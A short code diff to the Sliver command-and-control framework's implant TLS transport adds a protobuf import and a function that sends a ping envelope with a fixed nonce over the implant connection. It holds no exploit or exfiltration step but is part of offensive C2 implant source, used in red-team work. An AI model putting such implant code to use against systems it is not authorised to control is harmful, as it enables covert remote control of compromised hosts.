@@ -33,6 +33,7 @@ import (
 
 	"os"
 
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 
 	"github.com/golang/protobuf/proto"
@@ -54,6 +55,20 @@ func socketWriteEnvelope(connection *tls.Conn, envelope *pb.Envelope) error {
 	connection.Write(dataLengthBuf.Bytes())
 	connection.Write(data)
 	return nil
+}
+
+func socketWritePing(connection *tls.Conn) error {
+	// {{if .Config.Debug}}
+	log.Print("Socket ping")
+	// {{end}}
+
+	// We don't need a real nonce here, we just need to write to the socket
+	pingBuf, _ := proto.Marshal(&sliverpb.Ping{Nonce: 31337})
+	envelope := sliverpb.Envelope{
+		Type: sliverpb.MsgPing,
+		Data: pingBuf,
+	}
+	return socketWriteEnvelope(connection, &envelope)
 }
 
 // socketReadEnvelope - Reads a message from the TLS connection using length prefix framing
